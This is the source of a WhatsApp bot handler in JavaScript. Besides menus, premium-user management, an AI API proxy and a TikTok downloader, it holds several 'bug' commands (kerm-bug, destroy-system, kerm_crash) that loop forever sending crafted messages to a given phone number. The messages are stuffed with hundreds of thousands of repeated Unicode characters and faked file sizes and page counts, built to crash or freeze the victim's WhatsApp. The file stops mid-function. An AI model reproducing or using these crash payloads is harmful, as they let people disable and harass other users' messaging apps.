require("./config")
const { WA_DEFAULT_EPHEMERAL, getAggregateVotesInPollMessage, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, downloadContentFromMessage, areJidsSameUser, getContentType, useMultiFileAuthState, makeWASocket, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, makeWaSocket } = require("@adiwajshing/baileys")
const fs = require('fs')
const util = require('util')
const axios = require('axios')
const { exec } = require("child_process")
const chalk = require('chalk')
const moment = require('moment-timezone');
const yts = require ('yt-search');
const didyoumean = require('didyoumean');
const similarity = require('similarity')

module.exports = async (AndraZyy, m) => {
try {
const from = m.key.remoteJid
var body = (m.mtype === 'interactiveResponseMessage') ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id : (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ""

const { smsg, fetchJson, getBuffer, fetchBuffer, getGroupAdmins, TelegraPh, isUrl, hitungmundur, sleep, clockString, checkBandwidth, runtime, tanggal, getRandom } = require('./lib/myfunc')
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');

const budy = (typeof m.text === 'string') ? m.text : '';
const prefixRegex = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα~¦|/\\©^]/;
const prefix = prefixRegex.test(body) ? body.match(prefixRegex)[0] : '.';
const isCmd = body.startsWith(prefix);
const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = body.trim().split(/ +/).slice(1)
const text = q = args.join(" ")
const sender = m.key.fromMe ? (AndraZyy.user.id.split(':')[0]+'@s.whatsapp.net' || AndraZyy.user.id) : (m.key.participant || m.key.remoteJid)
const botNumber = await AndraZyy.decodeJid(AndraZyy.user.id)
const senderNumber = sender.split('@')[0]
const isCreator = (m && m.sender && [botNumber, ...global.nomerOwner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)) || false;
const pushname = m.pushName || `${senderNumber}`
const isBot = botNumber.includes(senderNumber)
const quoted = m.quoted ? m.quoted : m
const mime = (quoted.msg || quoted).mimetype || ''
const groupMetadata = m.isGroup ? await AndraZyy.groupMetadata(from).catch(e => {}) : ''
const groupName = m.isGroup ? groupMetadata.subject : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false

let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
let listStore = JSON.parse(fs.readFileSync('./database/list-message.json'));

if (m.message) {
console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', from))
}
try {
ppuser = await AndraZyy.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)

if (m.isGroup && isAlreadyResponList(m.chat, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
AndraZyy.sendMessage(m.chat, { text: sendResponList(m.chat, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
AndraZyy.sendMessage(m.chat, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
}
}
//FUNCTION ABAL ABAL 🗿
async function DocBug(target) {
 let virtex = "𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥 𝐈𝐦𝐮𝐭⚡";
   AndraZyy.relayMessage(target, {
     groupMentionedMessage: {
       message: {
        interactiveMessage: {
          header: {
            documentMessage: {
              url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "99999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "⚡𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥 𝐈𝐦𝐮𝐭⚡" + "ꦾ".repeat(100000) + "@1".repeat(300000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "igwe" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function LocaBugs(target) {
 await AndraZyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: `⚡𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥 𝐈𝐦𝐮𝐭⚡`+'ꦾ'.repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "⚡𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥 𝐈𝐦𝐮𝐭⚡" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function killui(target, Ptcp = true) {
      await AndraZyy.relayMessage(
        target,
        {
          ephemeralMessage: {
            message: {
              interactiveMessage: {
                header: {
                  documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
                    mimetype:
                      "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                    fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                    fileLength: "9999999999999",
                    pageCount: 1316134911,
                    mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                    fileName: "⿻",
                    fileEncSha256:
                      "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                    directPath:
                      "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                    mediaKeyTimestamp: "1726867151",
                    contactVcard: true,
                    jpegThumbnail: ThM,
                  },
                  hasMediaAttachment: true,
                },
                body: {
                  text: "⿻\n" + "ꦾ".repeat(28000),
                },
                nativeFlowMessage: {
                  messageParamsJson: "{}",
                },
                contextInfo: {
                  mentionedJid: ["24105730123@s.whatsapp.net"],
                  forwardingScore: 1,
                  isForwarded: true,
                  fromMe: false,
                  participant: "0@s.whatsapp.net",
                  remoteJid: "status@broadcast",
                  quotedMessage: {
                    documentMessage: {
                      url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mimetype:
                        "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                      fileSha256:
                        "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                      fileLength: "9999999999999",
                      pageCount: 1316134911,
                      mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                      fileName: "Дѵөҫдԁө Ԍҵдѵд tђคเlคภ๔",
                      fileEncSha256:
                        "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                      directPath:
                        "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
                      mediaKeyTimestamp: "1724474503",
                      contactVcard: true,
                      thumbnailDirectPath:
                        "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
                      thumbnailSha256:
                        "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
                      thumbnailEncSha256:
                        "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
                      jpegThumbnail: "",
                    },
                  },
                },
              },
            },
          },
        },
        Ptcp
          ? {
              participant: {
                jid: target,
              },
            }
          : {}
      );
    }
    
async function ngeloc(target, kuwoted) {
var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
viewOnceMessage: {
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
}
}), { userJid: target, quoted: kuwoted })
await AndraZyy.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id })
}
    
async function func1(target) {
    await AndraZyy.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥" + "ꦹꦹꦹ".repeat(400000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "  𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}

const premium = JSON.parse(fs.readFileSync('./database/premium.json'))
const isPremium = [botNumber, ...premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
AndraZyy.sendContact = async (jid, kon, quoted = '', opts = {}) => {
let list = []
for (let i of kon) {
list.push({
displayName: await AryaRyuigichi.getName(i),
vcard: `BEGIN:VCARD\n
VERSION:3.0\n
N:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
FN:${await deltaJomok.getName(i + '@s.whatsapp.net')}\n
item1.TEL;waid=${i}:${i}\n
item1.X-ABLabel:Ponsel\n
item2.EMAIL;type=INTERNET:Kermd237@gmail.com\n
item2.X-ABLabel:Email\n
item3.URL:https://github.com/Kgtech-cmr\n
item3.X-ABLabel:GitHub\n
item4.ADR:;;Gabon;;;;\n
item4.X-ABLabel:Region\n
END:VCARD`
})
}
AndraZyy.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
}




const reSize = async(buffer, ukur1, ukur2) => {
   return new Promise(async(resolve, reject) => {
      let jimp = require('jimp')
      var baper = await jimp.read(buffer);
      var ab = await baper.resize(ukur1, ukur2).getBufferAsync(jimp.MIME_JPEG)
      resolve(ab)
   })
}
    const fkethmb = await reSize(ppuser, 300, 300)
    
    let jimp = require("jimp")
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

async function downloadMp3 (link) {
try {
AndraZyy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson (`https://api.kyuurzy.site/api/download/aio?query=${link}`)
AndraZyy.sendMessage(m.chat, { audio: {url: kyuu.result.url}, mimetype: "audio/mpeg"},{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}

async function downloadMp4 (link) {
try {
AndraZyy.sendMessage(m.chat, { react: { text: '🕒', key: m.key }})
let kyuu = await fetchJson(`https://api.kyuurzy.site/api/download/aio?query=${link}`)
AndraZyy.sendMessage(m.chat, { video: {url: kyuu.result.url}, caption: '' },{ quoted:m})
}catch (err) {
reply(`${err}`)
}
}


global.public = false
if (!global.public) {
if (!m.key.fromMe && !isCreator) return
}


const reply = (teks) => { 
AndraZyy.sendMessage(from, { text: teks, contextInfo: { 
"externalAdReply": { 
"showAdAttribution": true, 
"title": "𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥", 
"containsAutoReply": true, 
"mediaType": 1, 
"thumbnail": fkethmb, 
"mediaUrl": "error", 
"sourceUrl": "https://whatsapp.com/channel/0029Vafn6hc7DAX3fzsKtn45" }}}, { quoted: m }) }

const reply2 = (teks) => {
AndraZyy.sendMessage(from, { text : teks }, { quoted : m })
}

function getFormattedDate() {
  var currentDate = new Date();
  var day = currentDate.getDate();
  var month = currentDate.getMonth() + 1;
  var year = currentDate.getFullYear();
  var hours = currentDate.getHours();
  var minutes = currentDate.getMinutes();
  var seconds = currentDate.getSeconds();
}

let d = new Date(new Date + 3600000)
let locale = 'id'
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let date = d.toLocaleDateString(locale, {
  day: 'numeric',
  month: 'long',
  year: 'numeric'
})
const hariini = d.toLocaleDateString('id', { day: 'numeric', month: 'long', year: 'numeric' })

function msToTime(duration) {
var milliseconds = parseInt((duration % 1000) / 100),
seconds = Math.floor((duration / 1000) % 60),
minutes = Math.floor((duration / (1000 * 60)) % 60),
hours = Math.floor((duration / (1000 * 60 * 60)) % 24)

hours = (hours < 10) ? "0" + hours : hours
minutes = (minutes < 10) ? "0" + minutes : minutes
seconds = (seconds < 10) ? "0" + seconds : seconds
return hours + " Heure " + minutes + " Minute " + seconds + " Seconde"
}

function msToDate(ms) {
		temp = ms
		days = Math.floor(ms / (24*60*60*1000));
		daysms = ms % (24*60*60*1000);
		hours = Math.floor((daysms)/(60*60*1000));
		hoursms = ms % (60*60*1000);
		minutes = Math.floor((hoursms)/(60*1000));
		minutesms = ms % (60*1000);
		sec = Math.floor((minutesms)/(1000));
		return days+" Jour "+hours+" Heure "+ minutes + " Minute";
  }
const timee = moment().tz('Asia/Jakarta').format('HH:mm:ss')
if(timee < "23:59:00"){
var waktuucapan = 'Bonne nuit'
}
if(timee < "19:00:00"){
var waktuucapan = 'Bonsoir'
}
if(timee < "18:00:00"){
var waktuucapan = 'Bonjour'
}
if(timee < "15:00:00"){
var waktuucapan = 'Bonjour'
}
if(timee < "10:00:00"){
var waktuucapan = 'Bonjour'
}
if(timee < "05:00:00"){
var waktuucapan = 'Bonne Aube'
}
if(timee < "03:00:00"){
var waktuucapan = 'Joyeux minuit'
}

switch(command) {
case "shoto-agler": case "kerm-bug": case "nagi-freeze": case "destroy-system": case "kerm_crash": case "cruality":
if (!isPremium) return reply(" Prime spéciale ")
if (!q) {
return reply(`\`Example:\` : ${prefix+command} 237××`);
}
target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
reply(`𝑳𝒆𝒔 𝒃𝒖𝒈 ${prefix+command} 𝑬𝒏𝒗𝒐𝒚𝒆́ 𝒂𝒗𝒆𝒄 𝒔𝒖𝒄𝒄𝒆̀𝒔 𝒃𝒆́𝒃𝒆́🦋 𝒂𝒖 𝒏𝒖𝒎𝒆́𝒓𝒐 𝒅𝒆 𝒅𝒆𝒔𝒕𝒊𝒏𝒂𝒕𝒊𝒐𝒏. *𝑨𝒕𝒕𝒆𝒏𝒅 𝒂𝒖 𝒎𝒐𝒊𝒏𝒔 5 𝒎𝒊𝒏𝒖𝒕𝒆𝒔 𝒅𝒆 𝒄𝒐𝒏𝒈𝒆́ 𝒂𝒗𝒂𝒏𝒕 𝒅,𝒆𝒏𝒗𝒐𝒚𝒆𝒓 𝒅,𝒂𝒖𝒕𝒓𝒆𝒔 𝒃𝒖𝒈 𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟*`);
for (let i = 0; ; i++) {
await func1(target);
await ngeloc(target);
await killui(target);
await DocBug(target)
}
break;

case "menu": case "kerm": case "killer": case "gen3": case "genmenu": case "allmenu": case "bugmenu": {
if (!isPremium) return reply(" khusus premium ")
officialist = `${nomerOwner}@s.whatsapp.net`
whatsappmessage = `┏❐⌜ *𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥* ⌟
┃⚡ 𝐮𝐬𝐞𝐫 : *${pushname}*
┃⚡ 𝐧𝐚𝐦𝐞 : 𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟ 
┃⚡ 𝐯𝐞𝐫𝐬𝐢𝐨𝐧 : *( ${versionBot} )*⚡
┃⚡ 𝐫𝐮𝐧 : *${runtime(process.uptime())}*
┃⚡ 𝐬𝐭𝐚𝐭𝐮𝐬 : ${AndraZyy.public ? `Public Mode` : `Self Mode`}
┃⚡ 𝐨𝐰𝐧𝐞𝐫 : ${namaOwner}
┃⚡ 𝐩𝐫𝐞𝐟𝐢𝐱 : ( ${prefix} )
┃⚡ 𝐭𝐢𝐦𝐞 : ⏳ ${timee}
┃⚡ 𝐜𝐫𝐞𝐚𝐭𝐨𝐫 : 𝓛𝓸𝓻𝓭 𝓚𝓮𝓻𝓶🏌️.
┃⚡
┃ 𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥
┗════════════❐

*< more script to my botz here🐤🩸 >*
https://whatsapp.com/channel/0029Vafn6hc7DAX3fzsKtn45

┏❐⌜ *𝐎𝐰𝐧𝐞𝐫 𝐌𝐞𝐧𝐮*⌟
┃ ➮ self
┃ ➮ public
┃ ➮ addprem
┃ ➮ delprem
┃ ➮ hidetag
┗════════════❐

┏❐⌜ *𝐁𝐮𝐠 𝐌𝐞𝐧𝐮*⌟
┃ ➮ shoto-agler *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ➮ kerm-bug *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ➮ destroy-system *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ➮ cruality *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ➮ nagi-freeze *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┃ ➮ kerm_crash *<𝐧𝐮𝐦𝐛𝐞𝐫>*
┗════════════❐

┏❐⌜ *𝐀𝐈 𝐌𝐞𝐧𝐮*⌟
┃ ➮ ai <teks>
┗════════════❐

┏❐⌜ *𝐓𝐨𝐨𝐥𝐬 𝐌𝐞𝐧𝐮*⌟
┃ ➮ remini
┃ ➮ tt
┃ ➮ url
┃ ➮ splay
┃ ➮ kick
┗════════════❐

*𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟🐦💥*
https://whatsapp.com/channel/0029Vafn6hc7DAX3fzsKtn45
* BIG THANKS TO 💐*

*< (>_<) my best helpers>*
> 𝗡𝗢𝗕𝗢𝗗𝗬. 🧞‍♂️🤲🏽
--------------------------------
> ᑲ᥆𝗍 ᥒᥲmᥱ : 𝗞𝗘𝗥𝗠|𝗩𝟲 𝟯⃟
> ᥴrᥱᥲ𝗍᥆r : 𝗟𝗢𝗥𝗗 𝗞𝗘𝗥𝗠 

 `
AndraZyy.sendMessage(from, { image: thumb, caption: whatsappmessage, mentions:[sender, officialist] }, { quoted: m })
}
break

 //GAK USAH RENAME, KETAHUAN REANAME TANGGUNG RESIKO LU SENDIRI

case "hidetag": case "tag": case "h": {
if (!isPremium) return reply(" 𝑫𝒆́𝒔𝒐𝒍𝒆́, 𝒗𝒐𝒖𝒔 𝒏,𝒂𝒗𝒆𝒛 𝒑𝒂𝒔 𝒂𝒄𝒄𝒆̀𝒔 𝒊𝒅𝒊𝒐𝒕. 🧞‍♂️🤲🏽")
if (!m.quoted && !text) return m.reply(example("𝑬𝒙: 𝑯𝒊𝒅𝒆𝒕𝒂𝒈 𝑺𝒂𝒍𝒖𝒕 𝑲𝒆𝒓𝒎/ 𝑻𝒊𝒓𝒆 𝒍𝒆 𝒎𝒔𝒈 𝒑𝒐𝒖𝒓 𝒕𝒂𝒈𝒖𝒆𝒓. 🧞‍♂️🤲🏽"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
AndraZyy.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break

case "public": {
if (!isPremium) return reply(" 𝑫𝒆́𝒔𝒐𝒍𝒆́, 𝒗𝒐𝒖𝒔 𝒏,𝒂𝒗𝒆𝒛 𝒑𝒂𝒔 𝒂𝒄𝒄𝒆̀𝒔 𝒊𝒅𝒊𝒐𝒕. 🧞‍♂️🤲🏽")
AndraZyy.public = true
reply(`Le bot est maintenant sur mode public. 🧞‍♂️🤲🏽`)
}
break

case "self": {
if (!isPremium) return reply(" 𝑫𝒆́𝒔𝒐𝒍𝒆́, 𝒗𝒐𝒖𝒔 𝒏,𝒂𝒗𝒆𝒛 𝒑𝒂𝒔 𝒂𝒄𝒄𝒆̀𝒔 𝒊𝒅𝒊𝒐𝒕. 🧞‍♂️🤲🏽 ")
AndraZyy.public = false
reply(`Le bot est maintenant sur mode private. 🧞‍♂️🤲🏽`)
}
break

case 'addprem':
if (!isPremium) return reply(" 𝑫𝒆́𝒔𝒐𝒍𝒆́, 𝒗𝒐𝒖𝒔 𝒏,𝒂𝒗𝒆𝒛 𝒑𝒂𝒔 𝒂𝒄𝒄𝒆̀𝒔 𝒊𝒅𝒊𝒐𝒕. 🧞‍♂️🤲🏽 ")
if (!args[0]) return reply(`𝑼𝒕𝒊𝒍𝒊𝒔𝒆 ${prefix+command} 𝒏𝒖𝒎𝒆́𝒓𝒐\n𝑬𝒙𝒆𝒎𝒑𝒍𝒆 ${prefix+command} 237xxxx`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknya = await AndraZyy.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`𝑬𝒏𝒕𝒓𝒆𝒛 𝒖𝒏 𝒏𝒖𝒎𝒆́𝒓𝒐 𝒗𝒂𝒍𝒊𝒅𝒆 𝒆𝒕 𝒆𝒏𝒓𝒆𝒈𝒊𝒔𝒕𝒓𝒆́ 𝒔𝒖𝒓 𝑾𝒉𝒂𝒕𝒔𝑨𝒑𝒑. 🧞‍♂️🤲🏽`)
premium.push(prrkek)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`𝑶𝑲 ${prrkek} 𝑨 𝒓𝒆𝒄̧𝒖 𝒍,𝒂𝒄𝒄𝒆̀𝒔. 🧞‍♂️🤲🏽`)
break

case 'delprem':
if (!isPremium) return reply(" 𝑫𝒆́𝒔𝒐𝒍𝒆́, 𝒗𝒐𝒖𝒔 𝒏,𝒂𝒗𝒆𝒛 𝒑𝒂𝒔 𝒂𝒄𝒄𝒆̀𝒔 𝒊𝒅𝒊𝒐𝒕. 🧞‍♂️🤲🏽 ")
if (!args[0]) return reply(`𝑼𝒕𝒊𝒍𝒊𝒔𝒆 ${prefix+command} 𝒏𝒖𝒎𝒆́𝒓𝒐\n𝑬𝒙𝒆𝒎𝒑𝒍𝒆 ${prefix+command} 237xxx`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = premium.indexOf(ya)
premium.splice(unp, 1)
fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
reply(`𝑩𝒊𝒆𝒏 ${ya} 𝒏,𝒂 𝒑𝒍𝒖𝒔 𝒂𝒄𝒄𝒆̀𝒔. 🧞‍♂️🤲🏽`)
break

/**
  * MannRzyne
  * don't forget to follow
  * https://whatsapp.com/channel/0029VaGqCO6I1rcjc9hisJ3U/1567
*/

case "ai": case "genai": case "letmegpt": {
    if (!text) return m.reply("𝑻𝒆𝒙𝒕𝒆 𝒅,𝒆𝒏𝒕𝒓𝒆́𝒆!");
    axios({
        method: 'POST',
        url: 'https://api.manaxu.my.id/api/ai/search',
        headers: {
            'x-api-key': 'key-manaxu-free',
            'Content-Type': 'application/json'
        },
        data: {
            question: text,
            model: command
        }
    })
    .then(_ => {
        m.reply(_.data.result);
    })
    .catch(e => {
        m.reply(e.message);
        console.error(e);
    });
}
break;

/**
  * Feature Ai With Logic & Sessions Made by MannR
  * Don't forget to follow
  * https://whatsapp.com/channel/0029VaGqCO6I1rcjc9hisJ3U
*/

case "ai": {
  if (!text) return m.reply("yes ?");
  const aiSessions = shyzu.ai_sessions ?? {};
  const senderId = m.sender;

  if (!aiSessions[senderId]) {
    aiSessions[senderId] = { messages: [] };
  }

  const msgs = [
    ...aiSessions[senderId].messages,
    { content: text, role: "user" }
  ];

  const api_url = 'https://api.manaxu.my.id/api/ai';
  const api_key = 'key-manaxu-free';

  axios({
    method: 'POST',
    url: api_url,
    headers: {
      'x-api-key': api_key,
      'Content-Type': 'application/json'
    },
    data: {
      logic: '𝑽𝒐𝒖𝒔 𝒗𝒐𝒖𝒔 𝒂𝒑𝒑𝒆𝒍𝒆𝒛 𝑺𝒉𝒚𝒛𝒖, 𝒖𝒏 𝒂𝒔𝒔𝒊𝒔𝒕𝒂𝒏𝒕 𝑰𝑨 𝒊𝒏𝒕𝒆𝒍𝒍𝒊𝒈𝒆𝒏𝒕 𝒄𝒓𝒆́𝒆́ 𝒑𝒂𝒓 𝑲𝒆𝒓𝒎. 🧞‍♂️🤲🏽',
      messages: msgs
    }
  })
  .then(response => {
    if (response.status === 200) {
      const { result } = response.data;
      m.reply(result ?? "𝑯𝒎𝒎𝒎 𝒐𝒏 𝒅𝒊𝒓𝒂𝒊𝒕 𝒒𝒖,𝒊𝒍 𝒚 𝒂 𝒖𝒏𝒆 𝒆𝒓𝒓𝒆𝒖𝒓 𝒅𝒂𝒏𝒔 𝒍,𝑨𝑷𝑰, 𝒅𝒆𝒎𝒂𝒏𝒅𝒆𝒛 𝒅𝒆 𝒍,𝒂𝒊𝒅𝒆 𝒂𝒖 𝒑𝒓𝒐𝒑𝒓𝒊𝒆́𝒕𝒂𝒊𝒓𝒆. 🧞‍♂️🤲🏽");
      aiSessions[senderId].messages.push({ content: text, role: "user" });
      aiSessions[senderId].messages.push({ content: result, role: "assistant" });
      shyzu.ai_sessions = aiSessions;
    } else {
      m.reply("𝑯𝒎𝒎𝒎 𝒐𝒏 𝒅𝒊𝒓𝒂𝒊𝒕 𝒒𝒖,𝒊𝒍 𝒚 𝒂 𝒖𝒏𝒆 𝒆𝒓𝒓𝒆𝒖𝒓 𝒅𝒂𝒏𝒔 𝒍,𝑨𝑷𝑰, 𝒅𝒆𝒎𝒂𝒏𝒅𝒆𝒛 𝒅𝒆 𝒍,𝒂𝒊𝒅𝒆 𝒂𝒖 𝒑𝒓𝒐𝒑𝒓𝒊𝒆́𝒕𝒂𝒊𝒓𝒆. 🧞‍♂️🤲🏽");
    }
  })
  .catch(error => {
    console.error(error);
    m.reply("𝑯𝒎𝒎𝒎 𝒐𝒏 𝒅𝒊𝒓𝒂𝒊𝒕 𝒒𝒖𝒆 𝒒𝒖𝒆𝒍𝒒𝒖𝒆 𝒄𝒉𝒐𝒔𝒆 𝒔,𝒆𝒔𝒕 𝒎𝒂𝒍 𝒑𝒂𝒔𝒔𝒆́, 𝒗𝒆𝒖𝒊𝒍𝒍𝒆𝒛 𝒅𝒆𝒎𝒂𝒏𝒅𝒆𝒓 𝒅𝒆 𝒍,𝒂𝒊𝒅𝒆 𝒂𝒖 𝒑𝒓𝒐𝒑𝒓𝒊𝒆́𝒕𝒂𝒊𝒓𝒆. 🧞‍♂️🤲🏽");
  });
}
break;

//===========TOOLS MENU=========//
case 'tiktok': case 'tt': {
  if (!text) return reply(`Contoh: ${prefix + command} link`);
  reply("𝑬𝒏 𝒄𝒐𝒖𝒓𝒔...")
 const data = await fetchJson(`https://api.tiklydown.eu.org/api/download?url=${encodeURIComponent(text)}`)
  const vidnya = data.video.noWatermark
  const caption = `*[ TIKTOK DOWNLOADER ]*
 *Video dari* _${data.author.name ?? ''} (@${data.author.unique_id ?? ''})_
*Likes*: _${data.stats.likeCount ?? ''}_
